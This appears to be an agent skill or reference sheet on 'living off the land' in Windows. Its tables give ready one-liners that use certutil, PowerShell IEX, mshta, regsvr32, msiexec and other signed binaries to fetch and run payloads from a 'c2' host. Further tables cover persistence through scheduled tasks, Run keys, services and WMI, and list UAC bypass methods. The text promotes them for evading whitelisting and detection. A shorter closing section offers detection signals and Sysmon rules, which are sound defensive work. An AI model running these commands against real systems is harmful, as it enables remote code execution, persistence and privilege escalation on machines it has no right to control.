---
name: lolbas-living-off-land
description: Living Off The Land Binaries And Scripts -- using legitimate signed Windows binaries (certutil, mshta, rundll32, regsvr32, msiexec, etc.) for download, execution, persistence, and UAC bypass.
metadata:
  type: reference
---

# LOLBAS -- Living Off The Land Binaries And Scripts

Using pre-installed, Microsoft-signed Windows binaries to download payloads, execute code,
bypass application whitelisting, and establish persistence -- without dropping custom tools.

Reference: https://lolbas-project.github.io/

## Why LOLBAS

- **Signed by Microsoft** -- passes application whitelisting (AppLocker, WDAC default policies)
- **Already present** -- no file drop needed, reduces forensic footprint
- **Legitimate usage exists** -- harder to write blanket detection rules
- **Proxy execution** -- the malicious action is attributed to a trusted binary

## Categories

### Download / Transfer

| Binary          | Command                                                        | Notes                    |
|-----------------|----------------------------------------------------------------|--------------------------|
| `certutil`      | `certutil -urlcache -split -f http://c2/payload.exe out.exe`  | Base64 decode also works |
| `bitsadmin`     | `bitsadmin /transfer job /download /priority high URL path`    | Background transfer      |
| `powershell`    | `iwr http://c2/p -o p.exe` or `IEX(iwr http://c2/s)`         | In-memory execution      |
| `curl.exe`      | `curl -o out.exe http://c2/payload.exe`                        | Win10 1803+              |
| `expand`        | `expand \\webdav\share\payload.cab -F:* C:\temp\`             | Cabinet extraction       |
| `esentutl`      | `esentutl /y \\live.sysinternals.com\tools\p.exe /d p.exe`    | Alternate copy mechanism |
| `desktopimgdownldr` | via `SettingSyncHost.exe`                                  | Obscure, low detection   |

### Execute / Proxy Execution

| Binary          | Command                                                        | Technique                 |
|-----------------|----------------------------------------------------------------|---------------------------|
| `mshta`         | `mshta http://c2/payload.hta`                                  | HTA execution             |
| `rundll32`      | `rundll32 javascript:"\..\mshtml,RunHTMLApplication";...`      | JS execution via COM      |
| `regsvr32`      | `regsvr32 /s /n /u /i:http://c2/file.sct scrobj.dll`          | Squiblydoo (scriptlet)    |
| `msiexec`       | `msiexec /q /i http://c2/payload.msi`                         | MSI package execution     |
| `cmstp`         | `cmstp /au C:\temp\payload.inf`                                | INF file execution        |
| `wmic`          | `wmic process call create "payload.exe"`                       | Process creation          |
| `forfiles`      | `forfiles /p C:\Windows /m notepad.exe /c "payload.exe"`      | Command execution         |
| `pcalua`        | `pcalua -a payload.exe`                                        | Program Compatibility     |
| `msconfig`      | Startup tab → add entry                                        | Persistence via GUI       |

### Compile / Build

| Binary          | Command                                                        | Notes                    |
|-----------------|----------------------------------------------------------------|--------------------------|
| `csc.exe`       | `csc /out:payload.exe source.cs`                               | C# compiler on every box |
| `vbc.exe`       | `vbc /out:payload.exe source.vb`                               | VB.NET compiler          |
| `msbuild`       | `msbuild inline_task.csproj`                                   | Inline C# task execution |
| `installutil`   | `installutil /logfile= /LogToConsole=false /U payload.dll`     | .NET installer bypass    |

### Persistence

| Binary          | Mechanism                                                      |
|-----------------|----------------------------------------------------------------|
| `schtasks`      | `schtasks /create /tn "Update" /tr payload.exe /sc onlogon`   |
| `reg`           | `reg add HKCU\...\Run /v Updater /d payload.exe`              |
| `sc`            | `sc create SvcName binPath= payload.exe`                       |
| `wmic`          | WMI event subscription (permanent consumer)                    |
| `mofcomp`       | Compile MOF file for WMI persistence                           |
| `netsh`         | `netsh add helper payload.dll` -- DLL loaded by netsh          |

### UAC Bypass

| Technique                  | Binary                                                    |
|----------------------------|-----------------------------------------------------------|
| fodhelper                  | `reg add HKCU\...\ms-settings\shell\open\command` + run   |
| computerdefaults           | Same registry hijack pattern                               |
| eventvwr                   | `mmc.exe` auto-elevate + registry hijack                   |
| sdclt                      | Backup/restore utility auto-elevate                        |
| cmstp                      | Auto-elevate INF install                                   |
| wsreset                    | Windows Store reset, auto-elevates                         |

## Detection Strategy

### High-Confidence Signals

```
certutil -urlcache -split -f    → downloading file (99% malicious in enterprise)
mshta http://                   → remote HTA execution
regsvr32 /i:http://             → Squiblydoo
msbuild *.csproj (non-dev box)  → inline task execution
rundll32 javascript:            → JS proxy execution
```

### Sysmon Rules

```xml
<ProcessCreate onmatch="include">
  <ParentImage condition="end with">mshta.exe</ParentImage>
  <ParentImage condition="end with">rundll32.exe</ParentImage>
  <Image condition="end with">certutil.exe</Image>
  <CommandLine condition="contains">-urlcache</CommandLine>
  <CommandLine condition="contains">/i:http</CommandLine>
</ProcessCreate>
```

### Behavioral Baseline

The most effective detection is behavioral anomaly: these binaries are legitimate, but their
usage patterns differ between admin/developer use and attacker use:

- `certutil` downloading from external IP (vs internal PKI)
- `msbuild` running on a workstation (vs CI/CD server)
- `csc.exe` compiling in `%TEMP%` (vs a project directory)
- `rundll32` with `javascript:` argument (never legitimate)

## Related Skills

- `dll-hijacking-com-persistence` -- persistence via DLL search order abuse
- `windows-uac-bypass-registry` -- UAC bypass techniques
- `edr-bypass-re` -- broader EDR evasion context
